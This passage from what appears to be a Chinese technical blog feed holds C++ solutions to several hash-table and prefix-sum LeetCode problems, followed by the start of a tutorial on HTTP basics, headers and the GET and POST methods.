class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">intersect</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums1) &#123;<br>            mp[num]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums2) &#123;<br>            <span class="hljs-keyword">if</span> (mp.<span class="hljs-built_in">count</span>(num)) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(num);<br>                <span class="hljs-keyword">if</span> (--mp[num] == <span class="hljs-number">0</span>) &#123;<br>                    mp.<span class="hljs-built_in">erase</span>(num);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="砖墙">砖墙</h2><blockquote><p>由于砖墙是一面矩形，所以对于任意一条垂线，其穿过的砖块数量加上从边缘经过的砖块数量之和是一个定值，即砖墙的高度。等价转换：求「垂线穿过的砖块边缘数量的最大值」，用砖墙的高度减去该最大值即为答案。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">leastBricks</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; wall)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> widths : wall) &#123;<br>            <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; widths.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123;<br>                sum += widths[i];<br>                cnt[sum]++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> maxCnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> [_, c] : cnt) &#123;<br>            maxCnt = <span class="hljs-built_in">max</span>(maxCnt, c);<br>        &#125;<br>        <span class="hljs-keyword">return</span> wall.<span class="hljs-built_in">size</span>() - maxCnt;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="在系统中查找重复文件">在系统中查找重复文件</h2><blockquote><p>通过字符串操作获取目录路径、文件名和文件内容。我们使用哈希映射（HashMap）来寻找重复文件，哈希映射中的键（key）是文件内容，值（value）是存储路径和文件名的列表。我们遍历每一个文件，并把它加入哈希映射中。在这之后，我们遍历哈希映射，如果一个键对应的值列表的长度大于1，说明我们找到了重复文件，可以把这个列表加入到答案中。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">findDuplicate</span>(vector&lt;string&gt;&amp; paths) &#123;<br>        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;<br>        <span class="hljs-keyword">for</span> (string s : paths) &#123;<br>            <span class="hljs-type">int</span> start = s.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27; &#x27;</span>);<br>            string path = s.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, start).<span class="hljs-built_in">append</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>            <span class="hljs-type">int</span> leftBracket = s.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;(&#x27;</span>, start);<br>            <span class="hljs-keyword">while</span> (leftBracket != <span class="hljs-number">-1</span>) &#123;<br>                string fileName = s.<span class="hljs-built_in">substr</span>(start + <span class="hljs-number">1</span>, leftBracket - start - <span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span> rightBracket = s.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;)&#x27;</span>, leftBracket);<br>                mp[s.<span class="hljs-built_in">substr</span>(leftBracket + <span class="hljs-number">1</span>, rightBracket - leftBracket - <span class="hljs-number">1</span>)]<br>                    .<span class="hljs-built_in">emplace_back</span>(path + fileName);<br>                start = rightBracket + <span class="hljs-number">1</span>;<br>                leftBracket = s.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;(&#x27;</span>, start);<br>            &#125;<br>        &#125;<br>        vector&lt;vector&lt;string&gt;&gt; res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p : mp) &#123;<br>            <span class="hljs-keyword">if</span> (p.second.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span>) &#123;<br>                res.<span class="hljs-built_in">emplace_back</span>(p.second);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="四数相加ii">四数相加II</h2><blockquote><p>看到形如：A+B....+N=0的式子，要转换为(A+...T)=-((T+1)...+N)再计算，这个T的分割点一般是一半，特殊情况下需要自行判断。定T是解题的关键。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fourSumCount</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums3,</span></span><br><span class="hljs-params"><span class="hljs-function">                     vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums4)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a : nums1) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b : nums2) &#123;<br>                cnt[a + b]++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a : nums3) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b : nums4) &#123;<br>                <span class="hljs-keyword">if</span> (cnt.<span class="hljs-built_in">count</span>(-a - b)) &#123;<br>                    ans += cnt[-a - b];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="哈希表与前缀和">4. 哈希表与前缀和</h1><h2 id="和为k的子数组">和为K的子数组</h2><blockquote><p>考虑以 <em>i</em> 结尾的和为 <em>k</em>的连续子数组个数时只要统计有多少个前缀和为<em>pre</em>[<em>i</em>]−<em>k</em> 的 <em>pre</em>[<em>j</em>]即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        mp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> pre = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            pre += num;<br>            <span class="hljs-keyword">if</span> (mp.<span class="hljs-built_in">count</span>(pre - k)) &#123;<br>                count += mp[pre - k];<br>            &#125;<br>            mp[pre]++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="连续的子数组和">连续的子数组和</h2><blockquote><p>同余定理：如果两个整数m、n满足n-m能被k整除，那么n和m对k同余。即当prefixSums[q]−prefixSums[p]为 k 的倍数时，prefixSums[p] 和 prefixSums[q]除以 k 的余数相同。只需要计算每个下标对应的前缀和除以 k的余数即可，使用哈希表存储每个余数第一次出现的下标。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checkSubarraySum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; mp;<br>        mp[<span class="hljs-number">0</span>]=<span class="hljs-number">-1</span>;<br>        <span class="hljs-type">int</span> remainder=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)&#123;<br>            remainder=(remainder+nums[i])%k;<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(remainder))&#123;<br>                <span class="hljs-type">int</span> preIndex=mp[remainder];<br>                <span class="hljs-keyword">if</span>((i-preIndex)&gt;=<span class="hljs-number">2</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                mp[remainder]=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="连续数组">连续数组</h2><blockquote><p>由于「0 和 1 的数量相同」等价于「1 的数量减去 0 的数量等于0」，我们可以将数组中的 0 视作−1，则原问题转换成「求最长的连续子数组，其元素和为 0」。遍历数组nums，当遇到元素 1 时将 counter的值加 1，当遇到元素 0 时将 counter的值减 1，遍历过程中使用哈希表存储每个前缀和第一次出现的下标。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMaxLength</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> maxLength = <span class="hljs-number">0</span>;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-type">int</span> counter = <span class="hljs-number">0</span>;<br>        mp[counter] = <span class="hljs-number">-1</span>;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> num = nums[i];<br>            <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>) &#123;<br>                counter++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                counter--;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (mp.<span class="hljs-built_in">count</span>(counter)) &#123;<br>                <span class="hljs-type">int</span> prevIndex = mp[counter];<br>                maxLength = <span class="hljs-built_in">max</span>(maxLength, i - prevIndex);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                mp[counter] = i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxLength;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP篇</title>
    <link href="/2024/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/HTTP%E7%AF%87/"/>
    <url>/2024/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/HTTP%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="http-基本概念">1. HTTP 基本概念</h1><h2 id="http简介">1.1 HTTP简介</h2><p>HTTP 是超文本传输协议，也就是<strong>H</strong>yperText<strong>T</strong>ransfer <strong>P</strong>rotocol。</p><blockquote><p>能否详细解释「超文本传输协议」？</p></blockquote><p>HTTP 的名字「超文本协议传输」，它可以拆成三个部分：</p><ul><li>超文本</li><li>传输</li><li>协议</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612793.png"alt="image-20240324135605552" /><figcaption aria-hidden="true">image-20240324135605552</figcaption></figure><p><em>1. 「协议」</em></p><p>在生活中，我们也能随处可见「协议」，例如：</p><ul><li>刚毕业时会签一个「三方协议」；</li><li>找房子时会签一个「租房协议」；</li></ul><p>生活中的协议，本质上与计算机中的协议是相同的，协议的特点：</p><ul><li>「<strong>协</strong>」：必须有<strong>两个以上的参与者</strong>。例如三方协议里的参与者有三个：你、公司、学校三个；租房协议里的参与者有两个：你和房东。</li><li>「<strong>议</strong>」：对参与者的一种<strong>行为约定和规范</strong>。例如三方协议里规定试用期期限、毁约金等；租房协议里规定租期期限、每月租金金额、违约如何处理等。</li></ul><p>针对<strong>协议</strong>，HTTP是一个用在计算机世界里的<strong>协议</strong>。它使用计算机能够理解的语言确立了一种计算机之间交流通信的规范（<strong>两个以上的参与者</strong>），以及相关的各种控制和错误处理方式（<strong>行为约定和规范</strong>）。</p><p><em>2. 「传输」</em></p><p>所谓的「传输」，很好理解，就是把一堆东西从 A 点 搬到 B 点，或者从 B点 搬到 A 点。别轻视了这个简单的动作，它至少包含两项重要的信息。HTTP协议是一个<strong>双向协议</strong>。</p><p>我们在上网冲浪时，浏览器是请求方 A，百度网站就是应答方 B。双方约定用HTTP协议来通信，于是浏览器把请求数据发送给网站，网站再把一些数据返回给浏览器，最后由浏览器渲染在屏幕，就可以看到图片、视频了。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612794.png"alt="image-20240324135841282" /><figcaption aria-hidden="true">image-20240324135841282</figcaption></figure><p>数据虽然是在 A 和 B之间传输，但允许中间有<strong>中转</strong>。比如第一排的同学想传递纸条给最后一排的同学，那么传递的过程中就需要经过许多同学（中间人），这样的传输方式就从「A&lt; --- &gt; B」，变成了「A &lt;-&gt; N &lt;-&gt; M &lt;-&gt; B」。而在HTTP 里，需要<strong>中间人</strong>遵从 HTTP协议，只要不打扰基本的数据传输，就可以添加任意额外的东西。</p><p>针对<strong>传输</strong>，HTTP是一个在计算机世界里专门用来在<strong>两点之间传输数据</strong>的约定和规范。</p><p><em>3. 「超文本」</em></p><p>HTTP 传输的内容是「超文本」</p><ul><li>「文本」：在互联网早期的时候只是简单的字符文字，但现在「文本」的涵义已经可以扩展为图片、视频、压缩包等，在HTTP 眼里这些都算作「文本」。</li><li>「超文本」，它就是<strong>超越了普通文本的文本</strong>，它是文字、图片、视频等的混合体，最关键有<strong>超链接</strong>，能从一个超文本跳转到另外一个超文本。</li></ul><p>HTML就是最常见的超文本，它本身只是纯文字文件，但内部用很多标签定义了图片、视频等的链接，再经过浏览器的解释，呈现给我们的就是一个文字、有画面的网页了。</p><p>综上：<strong>HTTP是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</strong></p><blockquote><p>概念辨析：「HTTP是用于从互联网服务器传输超文本到本地浏览器的协议」</p><p>这种说法是<strong>不正确</strong>的。因为也可以是「服务器&lt; --&gt;服务器」，所以采用<strong>两点之间</strong>的描述会更准确。</p></blockquote><h2 id="http-标头">1.2 HTTP 标头</h2><h3 id="host">1.2.1 Host</h3><p><strong>Host</strong>请求头指明了请求将要发送到的<strong>服务器主机名和端口号</strong>。如果没有包含端口号，会自动使用被请求服务的默认端口（比如HTTPS URL 使用 443 端口，HTTP URL 使用 80 端口）。所有 HTTP/1.1请求报文中必须包含一个Host头字段。对于缺少Host头或者含有超过一个Host头的HTTP/1.1 请求，可能会收到400（Bad Request）状态码。</p><ul><li><strong>语法</strong>：<code>Host: &lt;host&gt;:&lt;port&gt;</code></li><li><strong>指令</strong>：<ul><li><p><code>&lt;host&gt;</code>：服务器的域名（用于虚拟主机）。</p></li><li><p><code>&lt;port&gt;</code>：服务器监听的 TCP端口号（可选）。</p></li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612796.png"alt="image-20240324140844724" /><figcaption aria-hidden="true">image-20240324140844724</figcaption></figure><h3 id="content-length">1.2.2 Content-Length</h3><p><strong><code>Content-Length</code></strong>是一个实体消息首部，用来指明发送给接收方的消息主体的大小。例如，服务器在返回数据时，会有<code>Content-Length</code> 字段，表明本次回应的数据长度。</p><ul><li><strong>语法</strong>：<code>Content-Length: &lt;length&gt;</code></li><li><strong>指令</strong>：<ul><li><code>&lt;length&gt;</code>：消息的长度，用十进制数字表示的八位字节的数目。</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612797.png"alt="image-20240324141022342" /><figcaption aria-hidden="true">image-20240324141022342</figcaption></figure><h3 id="connection">1.2.3 Connection</h3><p><strong><code>Connection</code></strong>通用标头控制网络连接在当前会话完成后是否仍然保持打开状态。如果发送的值是<code>keep-alive</code>，则连接是持久的，不会关闭，允许对同一服务器进行后续请求。</p><ul><li><strong>语法</strong>：<code>Connection: keep-alive</code>；<code>Connection: close</code></li><li><strong>指令</strong>：<ul><li><code>close</code>：表明客户端或服务器想要关闭该网络连接，这是HTTP/1.0 请求的默认值。</li><li><code>keep-alive</code>：表明客户端想要保持该网络连接打开，HTTP/1.1的请求默认使用一个持久连接。</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612798.png"alt="image-20240324141432463" /><figcaption aria-hidden="true">image-20240324141432463</figcaption></figure><p>HTTP 持久连接的特点：只要任意一端没有明确提出断开连接，则保持 TCP连接状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612799.png"alt="image-20240324141529777" /><figcaption aria-hidden="true">image-20240324141529777</figcaption></figure><h3 id="content-type">1.2.4 Content-Type</h3><p><strong><code>Content-Type</code></strong> 实体头部用于指示资源的MIME 类型。在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=something<br></code></pre></td></tr></table></figure></li><li><p><strong>指令</strong>：</p><ul><li><code>media-type</code>：资源或数据的 MIME 类型 。</li><li><code>charset</code>：字符编码标准。</li><li><code>boundary</code>：对于多部分实体，boundary是必需的，其包括来自一组字符的 1 到 70个字符，已知通过电子邮件网关是非常健壮的，而不是以空白结尾。它用于封装消息的多个部分的边界。</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612800.png"alt="image-20240324141834032" /><figcaption aria-hidden="true">image-20240324141834032</figcaption></figure><h3 id="content-encoding">1.2.5 Content-Encoding</h3><p><strong><code>Content-Encoding</code></strong>列出了对当前实体消息（消息荷载）应用的任何编码类型，以及编码的顺序。它让接收者知道需要以何种顺序解码该实体消息才能获得原始荷载格式。Content-Encoding主要用于在不丢失原媒体类型内容的情况下压缩消息数据。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>compress<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>deflate<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>br<br><br>// 多个，按应用的编码顺序列出<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>deflate, gzip<br></code></pre></td></tr></table></figure></li><li><p><strong>指令</strong>：</p><ul><li><code>gzip</code>：表示采用 Lempel-Ziv coding（LZ77）压缩算法，以及32 位 CRC 校验的编码方式。</li><li><code>compress</code>：采用 Lempel-Ziv-Welch（LZW）压缩算法。</li><li><code>deflate</code>：采用 zlib 结构（在 RFC 1950 中规定），和deflate 压缩算法（在 RFC 1951 中规定)。</li><li><code>br</code>：表示采用 Brotli 算法的编码方式。</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612801.png"alt="image-20240324141917940" /><figcaption aria-hidden="true">image-20240324141917940</figcaption></figure><h2 id="http-请求方法">1.3 HTTP 请求方法</h2><h3 id="相关术语">1.3.0 相关术语</h3><p><strong>安全：</strong>如果说一个 HTTP方法是安全的，是指这是个不会修改服务器的数据的方法。也就是说，这是一个对服务器只读操作的方法。这些方法是安全的：<code>GET</code>，<code>HEAD</code>和<code>OPTIONS</code>。所有安全的方法都是幂等的，但并非所有幂等方法都是安全的，例如，PUT和 DELETE 都是幂等的，但不是安全的。</p><p><strong>幂等：</strong>一个 HTTP方法是幂等的，指的是同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，<code>GET</code> ， <code>HEAD</code> ， <code>PUT</code> 和<code>DELETE</code> 等方法都是幂等的，而 <code>POST</code>方法不是。需要注意的是，服务器不一定会确保请求方法的幂等性，有些应用可能会错误地打破幂等性约束。</p><p><strong>可缓存：</strong>可缓存的响应是可以缓存的 HTTP响应，它被存储起来以便后续的检索和使用，省去了对服务器的新的请求。</p><blockquote><p>实际过程中，开发者不一定会按照 RFC 规范定义的语义来实现 GET 和 POST方法。比如：</p><ul><li>可以用 GET 方法实现新增或删除数据的请求，这样实现的 GET方法自然就不是安全和幂等。</li><li>可以用 POST 方法实现查询数据的请求，这样实现的 POST方法自然就是安全和幂等。</li></ul><p>另外，URL 中的查询参数也不是 GET 所独有的，POST 请求的 URL中也可以有参数的。</p></blockquote><h3 id="get">1.3.1 GET</h3><p><strong>HTTP <code>GET</code> 方法</strong>请求指定资源的表示。使用<code>GET</code> 的请求应该只用于请求数据，而不应该包含数据。</p><blockquote><p><strong>注：</strong> 在 <code>GET</code>请求中发送请求体或有效载荷可能会导致一些现有的实现拒绝该请求——虽然规范没有禁止，但语义没有定义。最好是避免在<code>GET</code> 请求中发送有效载荷。</p></blockquote><table><thead><tr class="header"><th style="text-align: left;">请求是否有主体</th><th>否</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">成功的响应是否有主体</td><td>是</td></tr><tr class="even"><td style="text-align: left;">安全</td><td>是</td></tr><tr class="odd"><td style="text-align: left;">幂等</td><td>是</td></tr><tr class="even"><td style="text-align: left;">可缓存</td><td>是</td></tr><tr class="odd"><td style="text-align: left;">允许在 HTML 表单中使用</td><td>允许</td></tr></tbody></table><p><strong>语法</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /index.html<br></code></pre></td></tr></table></figure><h3 id="post">1.3.2 POST</h3><p><strong>HTTP <code>POST</code>方法</strong>发送数据给服务器。请求主体的类型由<code>Content-Type</code>标头指定。</p><p><code>PUT</code> 和 <code>POST</code> 方法的区别是，<code>PUT</code>方法是幂等的：调用一次与连续调用多次效果是相同的（即没有<em>副</em>作用），而连续调用多次相同的<code>POST</code> 方法可能会有副作用，比如多次提交同一订单。</p><p>一个<code>POST</code> 请求通常是通过 HTML表单发送的，并导致服务器的相应修改。在这种情况下，内容类型（contenttype）是通过在 <code>&lt;form&gt;</code> 元素中设置正确的<code>enctype</code> 属性，或是在 <code>&lt;input&gt;</code> 和<code>&lt;button&gt;</code>元素中设置 <code>formenctype</code>属性来选择的：</p><ul><li><code>application/x-www-form-urlencoded</code>：数据被编码成以<code>'&amp;'</code> 分隔的键值对，同时以 <code>'='</code>分隔键和值。键和值中非字母或数字的字符会被 <strong>URL编码</strong>，这也是这种类型不支持二进制数据的原因（应使用<code>multipart/form-data</code> 代替）。</li><li><code>multipart/form-data</code>：每个值是在一块数据（“主体部分”）中发送的，由用户代理指定的分隔符（“boundary”）将每个部分分离开。键值在每个部分的<code>Content-Disposition</code> 标头中给出。</li><li><code>text/plain</code></li></ul><table><thead><tr class="header"><th style="text-align: left;">请求是否有主体</th><th>是</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">成功的响应是否有主体</td><td>是</td></tr><tr class="even"><td style="text-align: left;">安全</td><td>否</td></tr><tr class="odd"><td style="text-align: left;">幂等</td><td>否</td></tr><tr class="even"><td style="text-align: left;">可缓存</td><td>仅在包含足够新的信息时</td></tr><tr class="odd"><td style="text-align: left;">允许在 HTML 表单中使用</td><td>允许</td></tr></tbody></table><p><strong>语法：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /test<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><p>使用默认的 <code>application/x-www-form-urlencoded</code> 作为content type 的简单表单：</p><figure 